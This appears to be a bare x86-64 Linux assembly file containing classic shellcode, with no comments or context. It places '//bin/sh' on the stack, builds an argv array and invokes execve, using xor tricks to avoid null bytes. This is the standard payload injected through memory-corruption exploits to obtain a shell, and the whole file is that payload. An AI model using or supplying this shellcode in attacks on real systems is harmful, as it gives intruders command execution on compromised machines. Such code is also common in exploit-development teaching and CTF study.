.section .text
.globl _start
_start:
    xorq %rax, %rax
    pushq %rax
    movabs $0x68732f6e69622f2f, %rax
    pushq %rax
    movq %rsp, %rdi
    xorq %rax, %rax
    pushq %rax
    pushq %rdi
    movq %rsp, %rsi
    xorq %rdx, %rdx
    movb $59, %al
    syscall

